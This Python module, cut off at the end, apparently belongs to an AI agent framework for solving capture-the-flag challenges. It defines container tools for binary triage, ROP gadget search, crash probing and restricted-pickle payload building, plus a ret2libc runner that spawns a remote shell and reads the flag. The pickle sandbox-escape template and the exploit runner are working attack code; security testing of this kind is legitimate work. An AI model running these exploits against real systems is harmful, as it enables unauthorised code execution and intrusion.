"""Category-specific (M2) tools that wrap one-shot container commands.

These differ from IAT (interactive) tools: each call runs a command and returns
its output. They are registered for the experts that need them (see
config/tools.yaml). r2_interact is the one stateful exception and uses an IAT
session.
"""

from __future__ import annotations

import base64
import re
import shlex
from urllib.parse import urlsplit

from midnight.env.ctf_environment import CTFEnvironment
from midnight.tools.interactive.session import DockerInteractiveSession
from midnight.tools.registry import register_tool
from midnight.tools.summarizer import summarize


def _result_text(result: object) -> str:
    """Format one-shot command output consistently for the model."""
    stdout = getattr(result, "stdout", "")
    stderr = getattr(result, "stderr", "")
    exit_code = getattr(result, "exit_code", "?")
    body = stdout
    if stderr:
        body += f"\n[stderr]\n{stderr}"
    body += f"\n[exit={exit_code}]"
    return summarize(body or "(no output)")


def _challenge_url(url: str, remote: str | None) -> str:
    """Resolve a URL against the evaluator-provided challenge endpoint."""
    value = url.strip()
    if not value:
        if not remote:
            raise ValueError("url is required because the challenge has no remote endpoint")
        return remote if "://" in remote else f"http://{remote}"
    if value.startswith("/"):
        if not remote:
            raise ValueError("relative url requires a challenge remote endpoint")
        base = remote if "://" in remote else f"http://{remote}"
        return base.rstrip("/") + value
    parsed = urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError("url must be an HTTP(S) URL or an absolute path")
    return value


@register_tool(name="binary_triage", groups=["pwn", "reverse"])
def make_binary_triage(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def binary_triage(binary: str) -> str:
        """Collect compact first-pass evidence for an ELF or packed binary.

        Reports type, protections, imports/symbols, high-value strings, compact
        section names, and main disassembly in one deterministic call. It does
        not modify input.
        """
        path = shlex.quote(binary)
        pwntools_probe = shlex.quote(
            f"from pwn import ELF; print(ELF({binary!r}, checksec=False).checksec())"
        )
        command = (
            f"file {path}; "
            f"python3 -c {pwntools_probe} "
            f"2>/dev/null || true; "
            f"echo '[imports-symbols]'; "
            f"(nm -an {path} 2>/dev/null; objdump -T {path} 2>/dev/null) | "
            "grep -Ei ' main$|win|flag|system|exec|read|write|gets|scanf|printf|puts|malloc|free' | head -80; "
            f"echo '[strings]'; strings -a -n 5 {path} | "
            "grep -Ei 'flag|correct|wrong|password|usage|/bin/sh|UPX|packed|alert|check' | head -80; "
            f"echo '[sections]'; readelf -SW {path} 2>/dev/null | "
            "awk '/\\[[[:space:]]*[0-9]+\\]/{print $2}' | tr '\\n' ' '; echo; "
            f"echo '[main-disassembly]'; objdump -d -M intel --disassemble=main {path} "
            "2>/dev/null | head -180"
        )
        res = await env.exec(command, timeout=120)
        body = res.stdout
        if res.stderr:
            body += f"\n[stderr]\n{res.stderr}"
        return summarize(body or "(no triage output)")

    return binary_triage


@register_tool(name="source_audit", groups=["pwn", "web", "reverse"])
def make_source_audit(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def source_audit(path: str = ".") -> str:
        """Find high-value CTF data flows and dangerous sinks in supplied source.

        This is a bounded, read-only first pass over common source and deployment
        files. Use its file:line evidence to select a focused playbook instead of
        launching broad scanners.
        """
        root = shlex.quote(path)
        pattern = (
            r"eval\(|exec\(|system\(|popen\(|subprocess|render_template_string|"
            r"pickle\.loads|yaml\.load|unserialize|include\(|require\(|open\(|"
            r"send_file|SELECT |INSERT |UPDATE |jwt|secret|password|flag|"
            r"strcpy|strcat|gets\(|scanf\(|printf\(|memcpy\(|malloc\(|free\("
            r"|unsafe[[:space:]]*\{|\.offset\(|read_exact|split_at|leak|\{:\?*p\}|static mut|"
            r"\[u8;[[:space:]]*[0-9]+\]|for[[:space:]].*\.\."
        )
        command = (
            f"echo '[files]'; find {root} -maxdepth 5 -type f "
            "\\( -name '*.py' -o -name '*.php' -o -name '*.js' -o -name '*.ts' "
            "-o -name '*.java' -o -name '*.c' -o -name '*.cc' -o -name '*.cpp' "
            "-o -name '*.go' -o -name '*.rs' -o -name 'Dockerfile*' "
            "-o -name '*.yml' -o -name '*.yaml' \\) "
            "! -name 'solve.py' ! -name 'progress.md' | head -160; "
            f"echo '[high-value-lines]'; grep -RInE -C 3 --binary-files=without-match "
            "--exclude=solve.py --exclude=progress.md "
            f"--exclude-dir=.git --exclude-dir=node_modules {shlex.quote(pattern)} {root} "
            "2>/dev/null | head -240"
        )
        return _result_text(await env.exec(command, timeout=90))

    return source_audit


@register_tool(name="pwn_rop_inventory", groups=["pwn"])
def make_pwn_rop_inventory(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import pathlib
import re
import subprocess
import sys

binary, function_query, leaked_symbol = sys.argv[1:]
path = pathlib.Path(binary)
if not path.is_file():
    raise FileNotFoundError(binary)

def run(argv, timeout=45):
    try:
        result = subprocess.run(argv, text=True, errors="replace", capture_output=True, timeout=timeout)
        return result.stdout + ("\n[stderr]\n" + result.stderr if result.stderr else "")
    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
        return f"[unavailable] {type(exc).__name__}: {exc}\n"

symbols_text = run(["nm", "-an", str(path)])
symbols = []
for line in symbols_text.splitlines():
    match = re.match(r"^([0-9a-fA-F]+)\s+([A-Za-z])\s+(.+)$", line)
    if match:
        symbols.append((int(match.group(1), 16), match.group(2), match.group(3)))

print("[address-model]")
print("PIE runtime address = leaked runtime symbol - static symbol offset + desired static offset")
if leaked_symbol:
    matches = [item for item in symbols if leaked_symbol.lower() in item[2].lower()]
    for address, kind, name in matches[:20]:
        print(f"leaked_symbol_candidate=0x{address:x} type={kind} name={name}")

functions = [item for item in symbols if item[1] in "tT" and function_query.lower() in item[2].lower()]
if function_query and functions:
    address, _, name = functions[0]
    disassembly = run(["objdump", "-d", "-Mintel", f"--disassemble={name}", str(path)])
    print("[function]")
    print(f"name={name} static_address=0x{address:x}")
    frame = re.search(r"sub\s+rsp,\s*0x([0-9a-f]+)", disassembly)
    buffers = [int(value, 16) for value in re.findall(r"lea\s+rdi,\s*\[rsp\s*\+\s*0x([0-9a-f]+)\]", disassembly)]
    if frame:
        frame_size = int(frame.group(1), 16)
        print(f"stack_frame_size=0x{frame_size:x}")
        for offset in sorted(set(buffers))[:16]:
            if offset < frame_size:
                print(f"candidate_buffer_rsp_offset=0x{offset:x} candidate_saved_return_distance=0x{frame_size-offset:x}")
        print("padding_invariant=candidate_saved_return_distance is already measured from the buffer start; use it directly and do not subtract candidate_buffer_rsp_offset again")
    print("[focused-disassembly]")
    for line in disassembly.splitlines():
        if any(token in line for token in ("sub    rsp", "lea    rdi", "call", "ret")):
            print(line[:240])

print("[writable-sections]")
sections = run(["readelf", "-SW", str(path)])
for line in sections.splitlines():
    if re.search(r"\sWA\s", line):
        print(line[:240])

print("[relocations]")
relocs = run(["readelf", "-Wr", str(path)])
for line in relocs.splitlines():
    if re.search(r"\b(read|write|system|execve|syscall|open|puts|printf)\b", line, re.I):
        print(line[:240])

print("[gadgets]")
gadgets = run(["ROPgadget", "--binary", str(path), "--only", "pop|ret|syscall|mov|call"], timeout=75)
patterns = (
    ("pop_rax", r": pop rax(?: ; [^;]+)* ; ret$"),
    ("pop_rdi", r": pop rdi(?: ; [^;]+)* ; ret$"),
    ("pop_rsi", r": pop rsi(?: ; [^;]+)* ; ret$"),
    ("pop_rdx", r": pop rdx(?: ; [^;]+)* ; ret$"),
    ("pop_rcx", r": pop rcx(?: ; [^;]+)* ; ret$"),
    ("syscall", r": syscall(?: ; ret)?$"),
    ("write_memory", r"mov qword ptr \[rdi\], rax"),
    ("indirect_call", r"call (?:rax|qword ptr \[rdi\])"),
)
selected = []
for label, pattern in patterns:
    matches = [line for line in gadgets.splitlines() if re.search(pattern, line, re.I)]
    for line in matches[:12]:
        selected.append(f"{label}: {line}")
for line in selected:
    print(line[:260])
if not selected:
    print("No filtered gadgets found; use ropper/objdump or a ret2csu sequence.")
print("[plan-checks]")
print("Confirm the first NUL sentinel required by any post-read strlen/count loop.")
print("Derive every runtime gadget as PIE base + static gadget offset; do not use static addresses directly.")
print("Treat the complete gadget text as semantics. Before using a side-effect gadget such as 'pop rdx ; add byte ptr [rax], al ; ret', make RAX point to writable mapped memory; the short label is not a plain pop.")
print("Prefer a verified read-to-writable-memory then execve/syscall chain when no win/system function exists.")
'''

    @tool
    async def pwn_rop_inventory(
        binary: str,
        function_query: str = "",
        leaked_symbol: str = "",
    ) -> str:
        """Extract a deterministic PIE/ROP plan from a local ELF.

        Reports static symbol offsets, candidate saved-return distances from a
        focused function's stack frame, writable sections, useful relocations,
        and filtered syscall/register/write gadgets. Use after source evidence
        proves a stack overwrite and a runtime code/data leak.
        """
        if not re.fullmatch(r"[A-Za-z0-9_:$<>.\-]*", function_query):
            raise ValueError("function_query contains unsupported characters")
        if not re.fullmatch(r"[A-Za-z0-9_:$<>.\-]*", leaked_symbol):
            raise ValueError("leaked_symbol contains unsupported characters")
        args = [binary, function_query, leaked_symbol]
        command = "python3 -c " + shlex.quote(program) + " " + " ".join(
            shlex.quote(value) for value in args
        )
        return _result_text(await env.exec(command, timeout=150))

    return pwn_rop_inventory


@register_tool(name="pickle_policy_audit", groups=["misc", "forensics"])
def make_pickle_policy_audit(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import ast
import base64
import importlib.util
import pathlib
import pickletools
import re
import sys

source_path, payload_value, payload_format, validator_path, function_name = sys.argv[1:]

def load_payload(value, fmt):
    if not value:
        return None
    if fmt == "file":
        return pathlib.Path(value).read_bytes()
    if fmt == "base64":
        return base64.b64decode(value, validate=True)
    raise ValueError("payload_format must be file or base64")

if source_path:
    if "\n" in source_path or "\r" in source_path or len(source_path) > 512:
        text = source_path
    else:
        candidate = pathlib.Path(source_path)
        text = candidate.read_text(errors="replace") if candidate.is_file() else source_path
    print("[policy]")
    for label in ("ALLOWED_PICKLE_MODULES", "ALLOWED_MODULES", "UNSAFE_NAMES", "BLOCKED_NAMES"):
        match = re.search(rf"(?m)^\s*{label}\s*=\s*(\[[^\n]*\]|\([^\n]*\)|\{{[^\n]*\}})", text)
        if match:
            try:
                print(f"{label}={ast.literal_eval(match.group(1))!r}")
            except Exception:
                print(f"{label}={match.group(1)}")
    for number, line in enumerate(text.splitlines(), 1):
        if any(term in line for term in ("find_class", "super().find_class", "UnpicklingError")):
            print(f"{number}: {line.strip()}")
    if "super().find_class" in text or "super(RestrictedUnpickler" in text:
        print("dotted_name_resolution=CPython find_class resolves protocol>=4 dotted names by repeated getattr")
    if "startswith" in text:
        print("prefix_filter_review=check whether the filter applies only to the complete requested name; an allowed leading object may expose nested attributes")
        print("mapping_note=pickle has no GETATTR or GETITEM opcode; GET/BINGET read memo slots. Resolve a bound mapping method through a dotted GLOBAL and invoke it with a tuple and REDUCE")
        print("version_note=function.__builtins__ is not portable across challenge Python versions; function.__globals__.__class__.get plus function.__globals__ works without mapping subscription")
        print('compiler_template=[{"op":"global","module":"<allowed_module>","name":"<function>.__globals__.__class__.get"},{"op":"memoize"},{"op":"global","module":"<allowed_module>","name":"<function>.__globals__"},{"op":"memoize"},{"op":"string","value":"__builtins__"},{"op":"call","count":2},{"op":"memoize"},{"op":"pop"},{"op":"get","index":0},{"op":"get","index":2},{"op":"string","value":"exec"},{"op":"call","count":2},{"op":"string","value":"<code>"},{"op":"call","count":1}]')

raw = load_payload(payload_value, payload_format)
if raw is not None:
    print("[payload]")
    print(f"length={len(raw)} protocol_marker={raw[:2].hex()}")
    try:
        ops = list(pickletools.genops(raw))
        for opcode, argument, position in ops:
            print(f"{position:04x} {opcode.name:<18} {argument!r}")
        print("opcode_validation=PASS")
    except Exception as exc:
        print(f"opcode_validation=FAIL {type(exc).__name__}: {exc}")
    if b"\x96" in raw:
        print("note: opcode 0x96 is BYTEARRAY8, not GETATTR; pickle has no GETATTR or GETITEM opcode")
    print("note: attribute traversal must be performed by an allowed dotted GLOBAL/STACK_GLOBAL name or by a verified callable plus REDUCE")

if validator_path and raw is not None:
    print("[validator]")
    path = pathlib.Path(validator_path).resolve()
    sys.path.insert(0, str(path.parent))
    spec = importlib.util.spec_from_file_location("midnight_pickle_validator", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    function = getattr(module, function_name)
    try:
        result = function(base64.b64encode(raw))
        print(f"validator=PASS result_type={type(result).__name__} result={result!r}"[:4000])
    except Exception as exc:
        print(f"validator=FAIL {type(exc).__name__}: {exc}"[:4000])
'''

    @tool
    async def pickle_policy_audit(
        source: str = "",
        payload: str = "",
        payload_format: str = "file",
        validator: str = "",
        validator_function: str = "unpickle",
    ) -> str:
        """Audit a restricted-pickle policy and validate exact payload opcodes.

        ``source`` is a custom Unpickler file path or its inline source text.
        ``payload`` is either a local file path or Base64 text. When ``validator`` is supplied, the named
        function is executed only inside the isolated challenge container using
        the exact payload bytes. This catches invented opcodes and policy
        violations before any target request.
        """
        normalized_format = payload_format.strip().lower()
        if normalized_format not in {"file", "base64"}:
            raise ValueError("payload_format must be file or base64")
        if validator_function and not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", validator_function):
            raise ValueError("validator_function must be a Python identifier")
        args = [source, payload, normalized_format, validator, validator_function]
        command = "python3 -c " + shlex.quote(program) + " " + " ".join(
            shlex.quote(value) for value in args
        )
        return _result_text(await env.exec(command, timeout=60))

    return pickle_policy_audit


@register_tool(name="pickle_build", groups=["misc", "forensics"])
def make_pickle_build(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import base64
import importlib.util
import io
import json
import pathlib
import pickletools
import struct
import sys

operations_json, output_path, validator_path, function_name = sys.argv[1:]
operations = json.loads(operations_json)
if not isinstance(operations, list) or not operations:
    raise ValueError("operations must be a non-empty JSON list")

payload = bytearray(b"\x80\x04")
depth = 0
memo_count = 0

def push_unicode(value):
    data = value.encode()
    if len(data) <= 255:
        payload.extend(b"\x8c" + bytes([len(data)]) + data)
    else:
        payload.extend(b"X" + struct.pack("<I", len(data)) + data)

for index, item in enumerate(operations):
    if not isinstance(item, dict) or not isinstance(item.get("op"), str):
        raise ValueError(f"operation {index} must be an object with string op")
    op = item["op"].lower()
    if op == "global":
        module, name = item.get("module"), item.get("name")
        if not isinstance(module, str) or not isinstance(name, str) or not module or not name:
            raise ValueError(f"operation {index}: global requires module and name")
        push_unicode(module)
        push_unicode(name)
        payload.extend(b"\x93")
        depth += 1
    elif op == "string":
        value = item.get("value")
        if not isinstance(value, str):
            raise ValueError(f"operation {index}: string requires value")
        push_unicode(value)
        depth += 1
    elif op == "bytes":
        value = base64.b64decode(item.get("base64", ""), validate=True)
        if len(value) <= 255:
            payload.extend(b"C" + bytes([len(value)]) + value)
        else:
            payload.extend(b"B" + struct.pack("<I", len(value)) + value)
        depth += 1
    elif op == "int":
        value = item.get("value")
        if not isinstance(value, int):
            raise ValueError(f"operation {index}: int requires an integer value")
        if 0 <= value <= 255:
            payload.extend(b"K" + bytes([value]))
        else:
            payload.extend(b"I" + str(value).encode() + b"\n")
        depth += 1
    elif op == "none":
        payload.extend(b"N")
        depth += 1
    elif op == "tuple":
        count = item.get("count")
        if not isinstance(count, int) or count < 0 or count > depth:
            raise ValueError(f"operation {index}: tuple count exceeds stack depth {depth}")
        if count == 0:
            payload.extend(b")")
        elif count == 1:
            payload.extend(b"\x85")
        elif count == 2:
            payload.extend(b"\x86")
        elif count == 3:
            payload.extend(b"\x87")
        else:
            raise ValueError(f"operation {index}: tuple count above 3 requires a staged plan")
        depth = depth - count + 1
    elif op == "reduce":
        if depth < 2:
            raise ValueError(f"operation {index}: REDUCE needs callable and argument tuple")
        payload.extend(b"R")
        depth -= 1
    elif op == "call":
        count = item.get("count")
        if not isinstance(count, int) or count < 0 or count > 3:
            raise ValueError(f"operation {index}: call count must be within 0..3")
        if depth < count + 1:
            raise ValueError(f"operation {index}: call needs a callable and {count} arguments")
        payload.extend((b")", b"\x85", b"\x86", b"\x87")[count])
        payload.extend(b"R")
        depth -= count
    elif op == "memoize":
        if depth < 1:
            raise ValueError(f"operation {index}: MEMOIZE needs a stack item")
        payload.extend(b"\x94")
        memo_count += 1
    elif op == "get":
        memo = item.get("index")
        if not isinstance(memo, int) or memo < 0 or memo >= memo_count:
            raise ValueError(f"operation {index}: memo index is not initialized")
        if memo <= 255:
            payload.extend(b"h" + bytes([memo]))
        else:
            payload.extend(b"j" + struct.pack("<I", memo))
        depth += 1
    elif op == "pop":
        if depth < 1:
            raise ValueError(f"operation {index}: POP on empty stack")
        payload.extend(b"0")
        depth -= 1
    elif op == "dup":
        if depth < 1:
            raise ValueError(f"operation {index}: DUP on empty stack")
        payload.extend(b"2")
        depth += 1
    else:
        raise ValueError(f"operation {index}: unsupported op {op!r}")

if depth != 1:
    raise ValueError(f"final pickle stack depth must be 1, got {depth}")
payload.extend(b".")
raw = bytes(payload)
target = pathlib.Path(output_path)
target.write_bytes(raw)
listing = io.StringIO()
pickletools.dis(raw, out=listing)
print(f"output={target} bytes={len(raw)} stack_depth={depth} memo_slots={memo_count}")
print(listing.getvalue())
print("payload_base64=" + base64.b64encode(raw).decode())

if validator_path:
    path = pathlib.Path(validator_path).resolve()
    sys.path.insert(0, str(path.parent))
    spec = importlib.util.spec_from_file_location("midnight_pickle_validator", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    function = getattr(module, function_name)
    try:
        result = function(base64.b64encode(raw))
        print(f"validator=PASS result_type={type(result).__name__} result={result!r}"[:4000])
    except Exception as exc:
        print(f"validator=FAIL {type(exc).__name__}: {exc}"[:4000])
'''

    @tool
    async def pickle_build(
        operations_json: str,
        output: str = "payload.pkl",
        validator: str = "",
        validator_function: str = "unpickle",
    ) -> str:
        """Compile a declarative pickle stack program and validate it.

        Pass a JSON list using ``global`` (module/name), ``string`` (value),
        ``bytes`` (base64), ``int`` (value), ``none``, ``tuple`` (count 0..3),
        ``reduce``, ``call`` (count 0..3, emits tuple plus REDUCE), ``memoize``,
        ``get`` (index), ``pop``, or ``dup``. The tool
        owns opcode bytes, checks stack depth, writes and disassembles the exact
        payload, and can invoke the local restricted validator.
        """
        if not output or "\x00" in output:
            raise ValueError("output must be a non-empty path")
        if validator_function and not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", validator_function):
            raise ValueError("validator_function must be a Python identifier")
        args = [operations_json, output, validator, validator_function]
        command = "python3 -c " + shlex.quote(program) + " " + " ".join(
            shlex.quote(value) for value in args
        )
        return _result_text(await env.exec(command, timeout=60))

    return pickle_build


@register_tool(name="upx_unpack", groups=["reverse"])
def make_upx_unpack(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def upx_unpack(binary: str, output: str = "unpacked") -> str:
        """Test and unpack a standard UPX binary into a writable output file.

        The original attachment is preserved. Returns UPX output followed by
        file information for the unpacked artifact.
        """
        src = shlex.quote(binary)
        dst = shlex.quote(output)
        command = (
            "command -v upx >/dev/null || { echo '[error] upx is not installed'; exit 127; }; "
            f"cp -- {src} {dst}.packed-copy && chmod u+w {dst}.packed-copy; "
            f"upx -t {dst}.packed-copy && upx -d -o {dst} {dst}.packed-copy && "
            f"chmod +x {dst} && file {dst}"
        )
        res = await env.exec(command, timeout=120)
        body = res.stdout
        if res.stderr:
            body += f"\n[stderr]\n{res.stderr}"
        body += f"\n[exit={res.exit_code}]"
        return summarize(body)

    return upx_unpack


@register_tool(name="pickle_disassemble", groups=["misc", "forensics"])
def make_pickle_disassemble(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pickle_disassemble(path: str) -> str:
        """Disassemble pickle bytes without loading or executing the payload."""
        program = shlex.quote(
            f"import pickletools; pickletools.dis(open({path!r}, 'rb').read())"
        )
        res = await env.exec(
            f"python3 -c {program}",
            timeout=30,
        )
        body = res.stdout
        if res.stderr:
            body += f"\n[stderr]\n{res.stderr}"
        body += f"\n[exit={res.exit_code}]"
        return summarize(body)

    return pickle_disassemble


@register_tool(name="checksec", groups=["pwn"])
def make_checksec(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def checksec(binary: str) -> str:
        """Show binary protections (RELRO/Canary/NX/PIE) for a binary path.

        Uses pwntools' checksec; falls back to readelf-based heuristics.
        """
        res = await env.exec(
            f'python3 -c "from pwn import ELF; e=ELF({binary!r}); print(e.checksec())" '
            f"2>/dev/null || checksec --file={binary} 2>/dev/null || "
            f"(echo '[fallback]'; readelf -lW {binary} | grep -E 'GNU_STACK|GNU_RELRO')"
        )
        return summarize(res.stdout or res.stderr or "(no output)")

    return checksec


@register_tool(name="pwn_crash_probe", groups=["pwn"])
def make_pwn_crash_probe(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pwn_crash_probe(
        binary: str,
        menu_prefix: str = "",
        sentinel_offset: int = -1,
        pattern_length: int = 512,
        timeout_seconds: int = 20,
        function_query: str = "read|recv|copy|lookup|parse|vuln",
    ) -> str:
        """Measure a stack overwrite with one deterministic batch-GDB run.

        Generated stdin is ``menu_prefix``, optional ``A`` padding plus NUL at
        ``sentinel_offset``, a pwntools cyclic pattern, and newline. The report
        includes registers, stack, backtrace, and candidate cyclic offsets.
        """
        if sentinel_offset < -1 or sentinel_offset > 65536:
            raise ValueError("sentinel_offset must be -1 or within 0..65536")
        if pattern_length < 32 or pattern_length > 65536:
            raise ValueError("pattern_length must be within 32..65536")
        if timeout_seconds < 2 or timeout_seconds > 120:
            raise ValueError("timeout_seconds must be within 2..120")
        if not re.fullmatch(r"[A-Za-z0-9_|:.+\-]{1,120}", function_query):
            raise ValueError("function_query contains unsupported characters")
        prefix_b64 = base64.b64encode(menu_prefix.encode()).decode()
        generator = shlex.quote(
            "from base64 import b64decode; from pwn import cyclic; "
            f"prefix=b64decode({prefix_b64!r}); sentinel={sentinel_offset}; "
            f"pattern=cyclic({pattern_length}); "
            "body=(pattern if sentinel < 0 else b'A'*sentinel+b'\\0'+pattern); "
            "open('/tmp/midnight-crash-input','wb').write(prefix+body+b'\\n')"
        )
        analyzer = shlex.quote(
            "import re; from pwn import cyclic_find; "
            "data=open('/tmp/midnight-gdb.log',errors='replace').read(); seen=set(); "
            "print('[candidate-cyclic-offsets]'); "
            "[(seen.add((v,o)),print(hex(v),o)) for v in "
            "[int(x,16) for x in re.findall(r'0x[0-9a-fA-F]{8,16}',data)] "
            "for o in [cyclic_find((v & 0xffffffff).to_bytes(4,'little'))] "
            "if o >= 0 and (v,o) not in seen]"
        )
        target = shlex.quote(binary)
        query = shlex.quote(function_query)
        command = (
            f"python3 -c {generator} && "
            f"timeout {timeout_seconds}s gdb -q -nx -batch {target} "
            "-ex 'set pagination off' -ex 'set confirm off' "
            "-ex 'run < /tmp/midnight-crash-input' "
            "-ex 'info registers rip rsp rbp rbx r12 r13 r14 r15' "
            "-ex 'x/64gx $rsp-0x100' -ex 'bt 12' "
            "> /tmp/midnight-gdb.log 2>&1 || true; "
            "cat /tmp/midnight-gdb.log; "
            "if ! grep -qE 'Program received signal|exited normally|Inferior .* exited' "
            "/tmp/midnight-gdb.log; then "
            "echo '[static-fallback: runtime registers unavailable]'; "
            f"nm -anC {target} 2>/dev/null | grep -Ei -- {query} | "
            "grep -Eiv ' (std|core|alloc|gimli|addr2line|object|rustc_demangle|dns_lookup)::' | head -40; "
            f"objdump -dC -Mintel {target} 2>/dev/null | "
            f"awk -v q={query} 'BEGIN{{IGNORECASE=1}} "
            "/^[0-9a-f]+ <.*>:$/{on=($0 ~ q && $0 !~ /<(std|core|alloc|gimli|addr2line|dns_lookup)::/)} "
            "on{print}' | head -500; fi; "
            f"python3 -c {analyzer}"
        )
        return _result_text(await env.exec(command, timeout=timeout_seconds + 20))

    return pwn_crash_probe


@register_tool(name="rop_gadget", groups=["pwn"])
def make_rop_gadget(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def rop_gadget(binary: str, query: str = "") -> str:
        """Find ROP gadgets in a binary (ROPgadget). Optional ``query`` greps
        the result, e.g. query='pop rdi'.
        """
        cmd = f"ROPgadget --binary {binary}"
        if query:
            cmd += f" | grep -i -- {query!r}"
        res = await env.exec(cmd, timeout=120)
        return summarize(res.stdout or res.stderr or "(no gadgets)")

    return rop_gadget


@register_tool(name="pwninit_setup", groups=["pwn"])
def make_pwninit_setup(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def pwninit_setup(
        binary: str,
        libc: str = "",
        linker: str = "",
        output_template: str = "",
    ) -> str:
        """Prepare a libc-based pwn challenge with pwninit.

        Patches a copy of the binary for the supplied libc/linker and creates a
        pwntools solve stub. With benchmark internet disabled, supply ``linker``
        when the matching loader is present in the challenge bundle.
        """
        parts = ["pwninit", "--bin", binary]
        if libc:
            parts += ["--libc", libc]
        if linker:
            parts += ["--ld", linker]
        if output_template:
            parts += ["--template-path", output_template]
        command = "command -v pwninit >/dev/null || exit 127; " + " ".join(
            shlex.quote(part) for part in parts
        )
        return _result_text(await env.exec(command, timeout=180))

    return pwninit_setup


@register_tool(name="pwn_ret2libc_target", groups=["pwn"])
def make_pwn_ret2libc_target(
    *, env: CTFEnvironment, state=None, observe_target_output=None, **_
) -> object:
    """Build a deterministic two-stage ret2libc runner for a bound target."""
    from langchain_core.tools import tool

    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")
    runner = r'''from pwn import *
import argparse, re, time
p=argparse.ArgumentParser()
p.add_argument('--binary',required=True); p.add_argument('--libc',required=True)
p.add_argument('--offset',required=True,type=int); p.add_argument('--host',required=True)
p.add_argument('--port',required=True,type=int); p.add_argument('--leak-symbol',default='puts')
p.add_argument('--return-symbol',default='main'); p.add_argument('--flag-path',default='/flag')
a=p.parse_args(); context.arch='amd64'; context.log_level='error'
elf=ELF(a.binary,checksec=False); libc=ELF(a.libc,checksec=False); rop=ROP(elf)
pop_rdi=rop.find_gadget(['pop rdi','ret']); ret=rop.find_gadget(['ret'])
if pop_rdi is None or ret is None: raise SystemExit('required amd64 gadgets were not found')
if a.leak_symbol not in elf.got or a.leak_symbol not in elf.plt: raise SystemExit('leak symbol missing from GOT/PLT')
if a.return_symbol not in elf.symbols or a.leak_symbol not in libc.symbols: raise SystemExit('required symbol missing')
io=remote(a.host,a.port,timeout=8); io.recvrepeat(0.7)
io.send(flat(b'A'*a.offset,pop_rdi.address,elf.got[a.leak_symbol],elf.plt[a.leak_symbol],elf.symbols[a.return_symbol]))
transcript=io.recvrepeat(0.7); base=None
for _ in range(6):
    chunk=io.recvline(timeout=3)
    if chunk: transcript += chunk
    for width in range(4,9):
        for start in range(0,max(0,len(transcript)-width+1)):
            address=u64(transcript[start:start+width].ljust(8,b'\0'))
            candidate=address-libc.symbols[a.leak_symbol]
            if 0x700000000000 <= address < 0x800000000000 and candidate > 0 and candidate & 0xfff == 0:
                base=candidate; break
        if base is not None: break
    if base is not None: break
if base is None:
    print('stage1_transcript_hex='+transcript.hex())
    raise SystemExit('no canonical page-aligned libc leak found in target output')
libc.address=base
io.send(flat(b'B'*a.offset,ret.address,pop_rdi.address,next(libc.search(b'/bin/sh\0')),libc.symbols['system']))
time.sleep(0.7); io.sendline(('cat '+a.flag_path).encode()); output=io.recvrepeat(4)
print(output.decode('latin1'))
if not re.search(rb'[A-Za-z0-9_]+\{[^}\r\n]+\}',output): raise SystemExit('shell stage returned no flag candidate')
'''
    encoded_runner = base64.b64encode(runner.encode()).decode()

    @tool
    async def pwn_ret2libc_target(
        binary: str,
        libc: str,
        offset: int,
        leak_symbol: str = "puts",
        return_symbol: str = "main",
        flag_path: str = "/flag",
        timeout_seconds: int = 30,
    ) -> str:
        """Run bounded two-stage amd64 ret2libc against the supplied target.

        Use after confirming a non-PIE stack overwrite, its saved-return offset,
        a matching libc, and a GOT/PLT leak symbol. Target output is recorded as
        flag provenance.
        """
        if not remote or ":" not in remote:
            raise ValueError("ret2libc target requires an evaluator-provided host:port")
        host, raw_port = remote.rsplit(":", 1)
        if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
            raise ValueError("the evaluator-provided target is not host:port")
        if offset < 8 or offset > 65536:
            raise ValueError("offset must be within 8..65536")
        if timeout_seconds < 5 or timeout_seconds > 120:
            raise ValueError("timeout_seconds must be within 5..120")
        for value, label in ((leak_symbol, "leak_symbol"), (return_symbol, "return_symbol")):
            if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_@.]*", value):
                raise ValueError(f"{label} contains unsupported characters")
        if not re.fullmatch(r"/[A-Za-z0-9_./*?-]{1,160}", flag_path):
            raise ValueError("flag_path contains unsupported characters")
        command = (
            f"printf %s {shlex.quote(encoded_runner)} | base64 -d > /tmp/midnight-ret2libc.py && "
            f"timeout {timeout_seconds}s python3 /tmp/midnight-ret2libc.py "
            f"--binary {shlex.quote(binary)} --libc {shlex.quote(libc)} --offset {offset} "
            f"--host {shlex.quote(host)} --port {raw_port} "
            f"--leak-symbol {shlex.quote(leak_symbol)} "
            f"--return-symbol {shlex.quote(return_symbol)} --flag-path {shlex.quote(flag_path)}"
        )
        result = await env.exec(command, timeout=timeout_seconds + 15)
        if observe_target_output is not None:
            observe_target_output(f"{result.stdout}\n{result.stderr}")
        return _result_text(result)

    return pwn_ret2libc_target


@register_tool(name="one_gadget", groups=["pwn"])
def make_one_gadget(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def one_gadget(libc: str, level: int = 0, near: str = "") -> str:
        """Find one-gadget offsets and their register/stack constraints in libc.

        ``level`` controls how many lower-probability candidates are shown.
        ``near`` may name functions such as 'exit,main' to rank nearby gadgets.
        """
        if level < 0 or level > 3:
            raise ValueError("level must be between 0 and 3")
        parts = ["one_gadget", "--level", str(level)]
        if near:
            parts += ["--near", near]
        parts.append(libc)
